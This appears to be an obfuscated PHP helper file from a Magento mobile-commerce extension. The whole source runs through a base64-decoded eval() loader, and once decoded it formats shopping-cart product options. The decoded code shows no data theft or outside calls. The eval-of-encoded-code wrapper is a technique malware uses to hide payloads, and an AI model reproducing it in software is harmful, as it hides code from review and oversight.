<?php function BHqIhKFyOGnSjDKOvGet($qPuTdHvMJQ){$r=base64_decode("YmFzZTY0X2RlY29kZSgkcVB1VGRIdk1KUSk=");return eval("return $r;");} eval('?>'.BHqIhKFyOGnSjDKOvGet('PD9waHANCiRHTE9CQUxTWyJlZWlubUVPcVJMU2hjcnVxSE5MQyJdPWJhc2U2NF9kZWNvZGUoIlkzVnpkRzl0YjNCMGFXOXUiKTskR0xPQkFMU1siUG1aR29GWHhhZ2JkVUtHdmxPeFUiXT1iYXNlNjRfZGVjb2RlKCJZblZ1Wkd4bFgyOXdkR2x2Ymc9PSIpOyRHTE9CQUxTWyJnVnFHQ0pNU3JweXpxY01OWHhDYyJdPWJhc2U2NF9kZWNvZGUoImFXNW1iMTlpZFhsU1pYRjFaWE4wIik7JEdMT0JBTFNbIkFDd2JZbWtudlRxTFJ2bnN6cUdkIl09YmFzZTY0X2RlY29kZSgiWkc5M2JteHZZV1JoWW14bFgyeHBibXRmYVdSeiIpOyRHTE9CQUxTWyJVcWtKcHhpSlJTRFlSUnBRR3RGdyJdPWJhc2U2NF9kZWNvZGUoIklIZ2ciKTskR0xPQkFMU1sieHVsbW13VHNUSkFpQ0NaenVFZlEiXT1iYXNlNjRfZGVjb2RlKCJZblZ1Wkd4bEwyTmhkR0ZzYjJkZmNISnZaSFZqZEY5amIyNW1hV2QxY21GMGFXOXUiKTskR0xPQkFMU1siQm5TYldRRXlCVFVrQkFzakV0enYiXT1iYXNlNjRfZGVjb2RlKCJZblZ1Wkd4bFgzTmxiR1ZqZEdsdmJsOXBaSE09Iik7JEdMT0JBTFNbImpBcGtZRndXRWdVTlpkcFhDbHBpIl09YmFzZTY0X2RlY29kZSgiWW5WdVpHeGxYMjl3ZEdsdmJsOXBaSE09Iik7JEdMT0JBTFNbIk9rR2xabUtxeVpTWWxla1V0Tkt0Il09YmFzZTY0X2RlY29kZSgiWVdSa2FYUnBiMjVoYkY5dmNIUnBiMjV6Iik7JEdMT0JBTFNbIm5OSGNKVGtkcGtBWnh4bkRXcExyIl09YmFzZTY0X2RlY29kZSgiWTNWemRHOXRYM1pwWlhjPSIpOyRHTE9CQUxTWyJIaUxTUG1Ebm9xd1hXTWlwc3lRZiJdPWJhc2U2NF9kZWNvZGUoImIzQjBhVzl1WDNSNWNHVT0iKTskR0xPQkFMU1siTXlHZlFZZFFHV0ZhYm5BaGJqR1IiXT1iYXNlNjRfZGVjb2RlKCJiM0IwYVc5dVgybGsiKTskR0xPQkFMU1sicHpjU2RscXFocHNyWGpWQlRjaEYiXT1iYXNlNjRfZGVjb2RlKCJjSEpwYm5SZmRtRnNkV1U9Iik7JEdMT0JBTFNbIm1TZUpzaERFVXBFU1VXVVNHUnFBIl09YmFzZTY0X2RlY29kZSgiYjNCMGFXOXVYdz09Iik7JEdMT0JBTFNbImxSQnp2ekJTRVFrSnhkQkl0YmciXT1iYXNlNjRfZGVjb2RlKCJMQT09Iik7JEdMT0JBTFNbIkJxTndkdVNwUEtsTlpkc0JIeG5PIl09YmFzZTY0X2RlY29kZSgiYjNCMGFXOXVYMmxrY3c9PSIpOyRHTE9CQUxTWyJUeVd2RWJxQmtQY251R1dtdEJsayJdPWJhc2U2NF9kZWNvZGUoIllYTnpiMk5wWVhSbFpGOXdjbTlrZFdOMFh3PT0iKTskR0xPQkFMU1siUmZ0QmlFT2NrU0FIWkJIUUl4cXoiXT1iYXNlNjRfZGVjb2RlKCJZMkYwWVd4dlp5OXdjbTlrZFdOMFgyTnZibVpwWjNWeVlYUnBiMjQ9Iik7JEdMT0JBTFNbIklYQ2ZLenNqbGl0clJpTVhGdkUiXT1iYXNlNjRfZGVjb2RlKCJjSEpwWTJVPSIpOyRHTE9CQUxTWyJURkZidG96VkdyR2ZHUmFha1pZdyJdPWJhc2U2NF9kZWNvZGUoImIzQjBhVzl1WDNCeWFXTmwiKTskR0xPQkFMU1siVE5qVUl3dlVDS1lvYXpKZ3RYaUkiXT1iYXNlNjRfZGVjb2RlKCJkbUZzZFdVPSIpOyRHTE9CQUxTWyJXTk9iQkp2amxmZ2J0eXRJWmZUcSJdPWJhc2U2NF9kZWNvZGUoImIzQjBhVzl1WDNaaGJIVmwiKTskR0xPQkFMU1siVVdJUGdqeEZvZk1NcmNvSXdnRm4iXT1iYXNlNjRfZGVjb2RlKCJiR0ZpWld3PSIpOyRHTE9CQUxTWyJKR2pjWkxpc1p1bmtqU1V4YWtKbiJdPWJhc2U2NF9kZWNvZGUoImIzQjBhVzl1WDNScGRHeGwiKTskR0xPQkFMU1siU25zU1N3TUtaU1llTUZuRWlybmgiXT1iYXNlNjRfZGVjb2RlKCIiKTskR0xPQkFMU1siSkRmZXlHRGJ2VVF1Y0hpVE1IeWoiXT1iYXNlNjRfZGVjb2RlKCJMQ0E9Iik7JEdMT0JBTFNbIktaTE1LWE1ZcWRuc2ZMWENrZnlrIl09YmFzZTY0X2RlY29kZSgiVEdsdWEzTT0iKTskR0xPQkFMU1sidHViWGJ3TWdLVFVHUGVLQW1xQ0YiXT1iYXNlNjRfZGVjb2RlKCJMQT09Iik7DQo/Pjw/cGhwDQpjbGFzcyBNb2JpY29tbWVyY2VfTW9iaXNlcnZpY2VzMl9IZWxwZXJfU2hvcHBpbmdjYXJ0IGV4dGVuZHMgTWFnZV9Db3JlX0hlbHBlcl9BYnN0cmFjdCB7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gZm9ybWF0T3B0aW9uc0NhcnQoJG9wdGlvbnMpIHsNCiAgICAgICAgJGRhdGEgPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkb3B0aW9ucyBhcyAkb3B0aW9uKSB7DQogICAgICAgICAgICAkZGF0YVtdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgJ29wdGlvbl90aXRsZScgPT4gJG9wdGlvblsnbGFiZWwnXSwNCiAgICAgICAgICAgICAgICAnb3B0aW9uX3ZhbHVlJyA9PiAkb3B0aW9uWyd2YWx1ZSddLA0KICAgICAgICAgICAgICAgICdvcHRpb25fcHJpY2UnID0+IGlzc2V0KCRvcHRpb25bJ3ByaWNlJ10pID09IHRydWUgPyAkb3B0aW9uWyRHTE9CQUxTWyJJWENmS3pzamxpdHJSaU1YRnZFIl1dIDogMCwNCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRkYXRhOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRPcHRpb25zKE1hZ2VfQ2F0YWxvZ19Nb2RlbF9Qcm9kdWN0X0NvbmZpZ3VyYXRpb25fSXRlbV9JbnRlcmZhY2UgJGl0ZW0pIHsNCiAgICAgICAgcmV0dXJuIGFycmF5X21lcmdlKA0KICAgICAgICAgICAgJHRoaXMtPmdldEJ1bmRsZU9wdGlvbnMoJGl0ZW0pLCANCiAgICAgICAgICAgICR0aGlzLT5mb3JtYXRPcHRpb25zQ2FydChNYWdlOjpoZWxwZXIoJEdMT0JBTFNbIlJmdEJpRU9ja1NBSFpCSFFJeHF6Il0pLT5nZXRDdXN0b21PcHRpb25zKCRpdGVtKSkNCiAgICAgICAgICAgICk7DQogICAgfQ0KDQogICAgDQogICAgcHVibGljIGZ1bmN0aW9uIGdldFVzZWRQcm9kdWN0T3B0aW9uKE1hZ2VfU2FsZXNfTW9kZWxfUXVvdGVfSXRlbSAkaXRlbSkgew0KICAgICAgICAkdHlwZUlkID0gJGl0ZW0tPmdldFByb2R1Y3QoKS0+Z2V0VHlwZUlkKCk7DQogICAgICAgIHN3aXRjaCAoJHR5cGVJZCkgew0KICAgICAgICAgICAgY2FzZSBNYWdlX0NhdGFsb2dfTW9kZWxfUHJvZHVjdF9UeXBlX0NvbmZpZ3VyYWJsZTo6VFlQRV9DT0RFOg0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+Z2V0Q29uZmlndXJhYmxlT3B0aW9ucygkaXRlbSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlIE1hZ2VfQ2F0YWxvZ19Nb2RlbF9Qcm9kdWN0X1R5cGVfR3JvdXBlZDo6VFlQRV9DT0RFOg0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+Z2V0R3JvdXBlZE9wdGlvbnMoJGl0ZW0pOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuICR0aGlzLT5nZXRDdXN0b21PcHRpb25zKCRpdGVtKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q29uZmlndXJhYmxlT3B0aW9ucyhNYWdlX0NhdGFsb2dfTW9kZWxfUHJvZHVjdF9Db25maWd1cmF0aW9uX0l0ZW1fSW50ZXJmYWNlICRpdGVtKQ0KICAgIHsNCiAgICAgICAgJHByb2R1Y3QgPSAkaXRlbS0+Z2V0UHJvZHVjdCgpOw0KICAgICAgICAkdHlwZUlkID0gJHByb2R1Y3QtPmdldFR5cGVJZCgpOw0KICAgICAgICAkYXR0cmlidXRlcyA9ICRwcm9kdWN0LT5nZXRUeXBlSW5zdGFuY2UodHJ1ZSkNCiAgICAgICAgICAgIC0+Z2V0U2VsZWN0ZWRBdHRyaWJ1dGVzSW5mbygkcHJvZHVjdCk7DQogICAgICAgIHJldHVybiBhcnJheV9tZXJnZSgkYXR0cmlidXRlcywgJHRoaXMtPmdldEN1c3RvbU9wdGlvbnMoJGl0ZW0pKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0R3JvdXBlZE9wdGlvbnMoTWFnZV9DYXRhbG9nX01vZGVsX1Byb2R1Y3RfQ29uZmlndXJhdGlvbl9JdGVtX0ludGVyZmFjZSAkaXRlbSkNCiAgICB7DQogICAgICAgICRwcm9kdWN0ID0gJGl0ZW0tPmdldFByb2R1Y3QoKTsNCiAgICAgICAgJHR5cGVJZCA9ICRwcm9kdWN0LT5nZXRUeXBlSWQoKTsNCiAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOw0KICAgICAgICANCiAgICAgICAgJHR5cGVJbnN0YW5jZSA9ICRwcm9kdWN0LT5nZXRUeXBlSW5zdGFuY2UodHJ1ZSk7DQogICAgICAgICRhc3NvY2lhdGVkUHJvZHVjdHMgPSAkdHlwZUluc3RhbmNlLT5nZXRBc3NvY2lhdGVkUHJvZHVjdHMoJHByb2R1Y3QpOw0KDQogICAgICAgIGlmICgkYXNzb2NpYXRlZFByb2R1Y3RzKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkYXNzb2NpYXRlZFByb2R1Y3RzIGFzICRhc3NvY2lhdGVkUHJvZHVjdCkgew0KICAgICAgICAgICAgICAgICRxdHkgPSAkaXRlbS0+Z2V0T3B0aW9uQnlDb2RlKCRHTE9CQUxTWyJUeVd2RWJxQmtQY251R1dtdEJsayJdIC4gJGFzc29jaWF0ZWRQcm9kdWN0LT5nZXRJZCgpKTsNCiAgICAgICAgICAgICAgICAkb3B0aW9uID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICdsYWJlbCcgPT4gJGFzc29jaWF0ZWRQcm9kdWN0LT5nZXROYW1lKCksDQogICAgICAgICAgICAgICAgICAgICd2YWx1ZScgPT4gKCRxdHkgJiYgJHF0eS0+Z2V0VmFsdWUoKSkgPyAkcXR5LT5nZXRWYWx1ZSgpIDogMA0KICAgICAgICAgICAgICAgICk7DQoNCiAgICAgICAgICAgICAgICAkb3B0aW9uc1tdID0gJG9wdGlvbjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgICRvcHRpb25zID0gYXJyYXlfbWVyZ2UoJG9wdGlvbnMsICR0aGlzLT5nZXRDdXN0b21PcHRpb25zKCRpdGVtKSk7DQogICAgICAgICRpc1VuQ29uZmlndXJlZCA9IHRydWU7DQogICAgICAgIGZvcmVhY2ggKCRvcHRpb25zIGFzICYkb3B0aW9uKSB7DQogICAgICAgICAgICBpZiAoJG9wdGlvblskR0xPQkFMU1siVE5qVUl3dlVDS1lvYXpKZ3RYaUkiXV0pIHsNCiAgICAgICAgICAgICAgICAkaXNVbkNvbmZpZ3VyZWQgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGlzVW5Db25maWd1cmVkID8gYXJyYXkoKSA6ICRvcHRpb25zOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDdXN0b21PcHRpb25zKE1hZ2VfU2FsZXNfTW9kZWxfUXVvdGVfSXRlbSAkaXRlbSkgew0KICAgICAgICAkb3B0aW9ucyA9IGFycmF5KCk7DQogICAgICAgICRwcm9kdWN0ID0gJGl0ZW0tPmdldFByb2R1Y3QoKTsNCiAgICAgICAgDQogICAgICAgIGlmICgkb3B0aW9uSWRzID0gJGl0ZW0tPmdldE9wdGlvbkJ5Q29kZSgnb3B0aW9uX2lkcycpKSB7DQogICAgICAgICAgICAkb3B0aW9ucyA9IGFycmF5KCk7DQogICAgICAgICAgICBmb3JlYWNoIChleHBsb2RlKCcsJywgJG9wdGlvbklkcy0+Z2V0VmFsdWUoKSkgYXMgJG9wdGlvbklkKSB7DQogICAgICAgICAgICAgICAgaWYgKCRvcHRpb24gPSAkcHJvZHVjdC0+Z2V0T3B0aW9uQnlJZCgkb3B0aW9uSWQpKSB7DQoNCiAgICAgICAgICAgICAgICAgICAgJHF1b3RlSXRlbU9wdGlvbiA9ICRpdGVtLT5nZXRPcHRpb25CeUNvZGUoJEdMT0JBTFNbIm1TZUpzaERFVXBFU1VXVVNHUnFBIl0gLiAkb3B0aW9uLT5nZXRJZCgpKTsNCg0KICAgICAgICAgICAgICAgICAgICAkZ3JvdXAgPSAkb3B0aW9uLT5ncm91cEZhY3RvcnkoJG9wdGlvbi0+Z2V0VHlwZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0+c2V0T3B0aW9uKCRvcHRpb24pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLT5zZXRRdW90ZUl0ZW1PcHRpb24oJHF1b3RlSXRlbU9wdGlvbik7DQoNCiAgICAgICAgICAgICAgICAgICAgJG9wdGlvbnNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2xhYmVsJyAgICAgICA9PiAkb3B0aW9uLT5nZXRUaXRsZSgpLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJyAgICAgICA9PiAkZ3JvdXAtPmdldEZvcm1hdHRlZE9wdGlvblZhbHVlKCRxdW90ZUl0ZW1PcHRpb24tPmdldFZhbHVlKCkpLA0KICAgICAgICAgICAgICAgICAgICAgICAgJEdMT0JBTFNbInB6Y1NkbHFxaHBzclhqVkJUY2hGIl0gPT4gJGdyb3VwLT5nZXRQcmludGFibGVPcHRpb25WYWx1ZSgkcXVvdGVJdGVtT3B0aW9uLT5nZXRWYWx1ZSgpKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJNeUdmUVlkUUdXRmFibkFoYmpHUiJdICAgPT4gJG9wdGlvbi0+Z2V0SWQoKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJIaUxTUG1Ebm9xd1hXTWlwc3lRZiJdID0+ICRvcHRpb24tPmdldFR5cGUoKSwNCiAgICAgICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJuTkhjSlRrZHBrQVp4eG5EV3BMciJdID0+ICRncm91cC0+aXNDdXN0b21pemVkVmlldygpDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmICgkYWRkT3B0aW9ucyA9ICRpdGVtLT5nZXRPcHRpb25CeUNvZGUoJEdMT0JBTFNbIk9rR2xabUtxeVpTWWxla1V0Tkt0Il0pKSB7DQogICAgICAgICAgICAkb3B0aW9ucyA9IGFycmF5X21lcmdlKCRvcHRpb25zLCB1bnNlcmlhbGl6ZSgkYWRkT3B0aW9ucy0+Z2V0VmFsdWUoKSkpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdGhpcy0+Zm9ybWF0T3B0aW9uc0NhcnQoJG9wdGlvbnMpOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCdW5kbGVPcHRpb25zKE1hZ2VfQ2F0YWxvZ19Nb2RlbF9Qcm9kdWN0X0NvbmZpZ3VyYXRpb25fSXRlbV9JbnRlcmZhY2UgJGl0ZW0pIHsNCiAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOw0KICAgICAgICAkcHJvZHVjdCA9ICRpdGVtLT5nZXRQcm9kdWN0KCk7DQogICAgICAgIA0KICAgICAgICAkdHlwZUluc3RhbmNlID0gJHByb2R1Y3QtPmdldFR5cGVJbnN0YW5jZSh0cnVlKTsNCg0KICAgICAgICAKICAgICAgICAkb3B0aW9uc1F1b3RlSXRlbU9wdGlvbiA9ICRpdGVtLT5nZXRPcHRpb25CeUNvZGUoJEdMT0JBTFNbImpBcGtZRndXRWdVTlpkcFhDbHBpIl0pOw0KICAgICAgICAkYnVuZGxlT3B0aW9uc0lkcyA9ICRvcHRpb25zUXVvdGVJdGVtT3B0aW9uID8gdW5zZXJpYWxpemUoJG9wdGlvbnNRdW90ZUl0ZW1PcHRpb24tPmdldFZhbHVlKCkpIDogYXJyYXkoKTsNCiAgICAgICAgaWYgKCRidW5kbGVPcHRpb25zSWRzKSB7DQogICAgICAgICAgICANCiAgICAgICAgICAgICRvcHRpb25zQ29sbGVjdGlvbiA9ICR0eXBlSW5zdGFuY2UtPmdldE9wdGlvbnNCeUlkcygkYnVuZGxlT3B0aW9uc0lkcywgJHByb2R1Y3QpOw0KDQogICAgICAgICAgICAKICAgICAgICAgICAgJHNlbGVjdGlvbnNRdW90ZUl0ZW1PcHRpb24gPSAkaXRlbS0+Z2V0T3B0aW9uQnlDb2RlKCRHTE9CQUxTWyJCblNiV1FFeUJUVWtCQXNqRXR6diJdKTsNCg0KICAgICAgICAgICAgJHNlbGVjdGlvbnNDb2xsZWN0aW9uID0gJHR5cGVJbnN0YW5jZS0+Z2V0U2VsZWN0aW9uc0J5SWRzKA0KICAgICAgICAgICAgICAgICAgICB1bnNlcmlhbGl6ZSgkc2VsZWN0aW9uc1F1b3RlSXRlbU9wdGlvbi0+Z2V0VmFsdWUoKSksICRwcm9kdWN0DQogICAgICAgICAgICApOw0KDQogICAgICAgICAgICAkYnVuZGxlT3B0aW9ucyA9ICRvcHRpb25zQ29sbGVjdGlvbi0+YXBwZW5kU2VsZWN0aW9ucygkc2VsZWN0aW9uc0NvbGxlY3Rpb24sIHRydWUpOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGJ1bmRsZU9wdGlvbnMgYXMgJGJ1bmRsZU9wdGlvbikgew0KICAgICAgICAgICAgICAgIGlmICgkYnVuZGxlT3B0aW9uLT5nZXRTZWxlY3Rpb25zKCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGJ1bmRsZVNlbGVjdGlvbnMgPSAkYnVuZGxlT3B0aW9uLT5nZXRTZWxlY3Rpb25zKCk7DQogICAgICAgICAgICAgICAgICAgICRvcHRpb24gPSBhcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkYnVuZGxlU2VsZWN0aW9ucyBhcyAkYnVuZGxlU2VsZWN0aW9uKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkY2hlY2sgPSBhcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgJHF0eSA9IE1hZ2U6OmhlbHBlcignYnVuZGxlL2NhdGFsb2dfcHJvZHVjdF9jb25maWd1cmF0aW9uJyktPmdldFNlbGVjdGlvblF0eSgkcHJvZHVjdCwgJGJ1bmRsZVNlbGVjdGlvbi0+Z2V0U2VsZWN0aW9uSWQoKSkgKiAxOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRxdHkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2hlY2tbXSA9ICRxdHkgLiAkR0xPQkFMU1siVXFrSnB4aUpSU0RZUlJwUUd0RnciXSAuICR0aGlzLT5lc2NhcGVIdG1sKCRidW5kbGVTZWxlY3Rpb24tPmdldE5hbWUoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG9wdGlvbltdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdvcHRpb25fdGl0bGUnID0+ICRidW5kbGVPcHRpb24tPmdldFRpdGxlKCksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdvcHRpb25fdmFsdWUnID0+ICRxdHkgLiAnIHggJyAuICR0aGlzLT5lc2NhcGVIdG1sKCRidW5kbGVTZWxlY3Rpb24tPmdldE5hbWUoKSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHTE9CQUxTWyJURkZidG96VkdyR2ZHUmFha1pZdyJdID0+IE1hZ2U6OmhlbHBlcigkR0xPQkFMU1sieHVsbW13VHNUSkFpQ0NaenVFZlEiXSktPmdldFNlbGVjdGlvbkZpbmFsUHJpY2UoJGl0ZW0sICRidW5kbGVTZWxlY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmICgkY2hlY2spDQogICAgICAgICAgICAgICAgICAgICAgICAkb3B0aW9uc1tdID0gJG9wdGlvbjsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuICRvcHRpb25zOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXREb3dubG9hZGFibGVPcHRpb25zKE1hZ2VfQ2F0YWxvZ19Nb2RlbF9Qcm9kdWN0X0NvbmZpZ3VyYXRpb25fSXRlbV9JbnRlcmZhY2UgJGl0ZW0pIHsNCiAgICAgICAgJG9wdGlvbnMgPSBhcnJheSgpOw0KICAgICAgICAkcHJvZHVjdCA9ICRpdGVtLT5nZXRQcm9kdWN0KCk7DQogICAgICAgIA0KICAgICAgICAkdHlwZUluc3RhbmNlID0gJHByb2R1Y3QtPmdldFR5cGVJbnN0YW5jZSh0cnVlKTsNCg0KICAgICAgICAKICAgICAgICAkb3B0aW9uc1F1b3RlSXRlbU9wdGlvbiA9ICRpdGVtLT5nZXRPcHRpb25CeUNvZGUoJEdMT0JBTFNbIkFDd2JZbWtudlRxTFJ2bnN6cUdkIl0pOw0KICAgICAgICAkRHRyV3p4WW1jQkpwRHZjUUdiakQgPSAkb3B0aW9uc1F1b3RlSXRlbU9wdGlvbiA/ICRvcHRpb25zUXVvdGVJdGVtT3B0aW9uLT5nZXRWYWx1ZSgpIDogYXJyYXkoKTsNCiAgICAgICAgaWYoIWVtcHR5KCREdHJXenhZbWNCSnBEdmNRR2JqRCkpew0KICAgICAgICAgICAgJER0cld6eFltY0JKcER2Y1FHYmpEID0gZXhwbG9kZSgkR0xPQkFMU1sidHViWGJ3TWdLVFVHUGVLQW1xQ0YiXSwgJER0cld6eFltY0JKcER2Y1FHYmpEKTsNCiAgICAgICAgfQ0KICAgICAgICAkb3B0aW9uc0NvbGxlY3Rpb24gPSAkdHlwZUluc3RhbmNlLT5nZXRMaW5rcygkcHJvZHVjdCk7DQogICAgICAgICRvcHRpb24gPSBhcnJheSgpOw0KICAgICAgICBmb3JlYWNoICgkb3B0aW9uc0NvbGxlY3Rpb24gYXMgJF9pdGVtKSB7DQogICAgICAgICAgICBpZiAoaW5fYXJyYXkoJF9pdGVtLT5nZXRJZCgpLCAkRHRyV3p4WW1jQkpwRHZjUUdiakQpKSB7DQogICAgICAgICAgICAgICAgJG9wdGlvbltdID0gJF9pdGVtLT5nZXRUaXRsZSgpOyAgICAgICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZighZW1wdHkoJG9wdGlvbikpew0KICAgICAgICAgICAgJG9wdGlvbnNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICdvcHRpb25fdGl0bGUnID0+ICJMaW5rcyIsDQogICAgICAgICAgICAgICAgJ29wdGlvbl92YWx1ZScgPT4gaW1wbG9kZSgiLCAiLCAkb3B0aW9uKSwNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBhcnJheV9tZXJnZSgNCiAgICAgICAgICAgICRvcHRpb25zLA0KICAgICAgICAgICAgJHRoaXMtPmZvcm1hdE9wdGlvbnNDYXJ0KE1hZ2U6OmhlbHBlcignY2F0YWxvZy9wcm9kdWN0X2NvbmZpZ3VyYXRpb24nKS0+Z2V0Q3VzdG9tT3B0aW9ucygkaXRlbSkpDQogICAgICAgICAgICApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRCdXJnZXJseW9uU2VsZWN0ZWRPcHRpb25zKCRpdGVtKXsNCiAgICAgICAgJG9wdGlvbiA9IHVuc2VyaWFsaXplKCRpdGVtLT5nZXRPcHRpb25CeUNvZGUoJEdMT0JBTFNbImdWcUdDSk1TcnB5enFjTU5YeENjIl0pLT5nZXRWYWx1ZSgpKTsNCiAgICAgICAgCiAgICAgICAgJFlxeUxpd1JDcU5FQlBxZnhCT1Z1ID0gYXJyYXkoKTsNCiAgICAgICAgaWYoaXNzZXQoJG9wdGlvblsnYnVuZGxlX29wdGlvbiddKSAmJiAhZW1wdHkoJG9wdGlvblskR0xPQkFMU1siUG1aR29GWHhhZ2JkVUtHdmxPeFUiXV0pKXsNCiAgICAgICAgICAgIGZvcmVhY2goJG9wdGlvblskR0xPQkFMU1siUG1aR29GWHhhZ2JkVUtHdmxPeFUiXV0gYXMgJE5NbXBLa1d4S3h1c3Jrd0xaQkxVID0+ICRfb3B0aW9uKXsNCiAgICAgICAgICAgICAgICAkWXF5TGl3UkNxTkVCUHFmeEJPVnVbJE5NbXBLa1d4S3h1c3Jrd0xaQkxVXSA9IGFycmF5KCk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCgkX29wdGlvbiBhcyAkWExZcW9hTmhWUVdIRGJ2V1BKbGYgPT4gJFJ5a1NYbGRnamN4bElnV29vS2V5KXsNCiAgICAgICAgICAgICAgICAgICAgJFlxeUxpd1JDcU5FQlBxZnhCT1Z1WyROTW1wS2tXeEt4dXNya3dMWkJMVV1bJFJ5a1NYbGRnamN4bElnV29vS2V5XSA9ICRSeWtTWGxkZ2pjeGxJZ1dvb0tleTsNCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoaXNzZXQoJG9wdGlvblskR0xPQkFMU1siZWVpbm1FT3FSTFNoY3J1cUhOTEMiXV1bJE5NbXBLa1d4S3h1c3Jrd0xaQkxVXVskUnlrU1hsZGdqY3hsSWdXb29LZXldKSl7DQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkb3B0aW9uWyRHTE9CQUxTWyJlZWlubUVPcVJMU2hjcnVxSE5MQyJdXVskTk1tcEtrV3hLeHVzcmt3TFpCTFVdWyRSeWtTWGxkZ2pjeGxJZ1dvb0tleV0gYXMgJFNyVlJrb2FFYkpJRFFoYlVCVFZIID0+ICRHWE1teG1ieGJHWU1JcmtuZVJMVSl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFlxeUxpd1JDcU5FQlBxZnhCT1Z1WyROTW1wS2tXeEt4dXNya3dMWkJMVV1bJFJ5a1NYbGRnamN4bElnV29vS2V5XSA9IGFycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCgkR1hNbXhtYnhiR1lNSXJrbmVSTFUgYXMgJHB3Snd4YXhHVklVSGlTR3Zhb0lOID0+ICR1dmxvbmZUU2RqVlFtSU5FVGdBTCl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRZcXlMaXdSQ3FORUJQcWZ4Qk9WdVskTk1tcEtrV3hLeHVzcmt3TFpCTFVdWyRSeWtTWGxkZ2pjeGxJZ1dvb0tleV1bJFNyVlJrb2FFYkpJRFFoYlVCVFZIXVskdXZsb25mVFNkalZRbUlORVRnQUxdID0gJEdMT0JBTFNbIlNuc1NTd01LWlNZZU1GbkVpcm5oIl07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgCiAgICAgICAgcmV0dXJuICRZcXlMaXdSQ3FORUJQcWZ4Qk9WdTsNCiAgICB9DQp9ID8+').'<?php '); ?>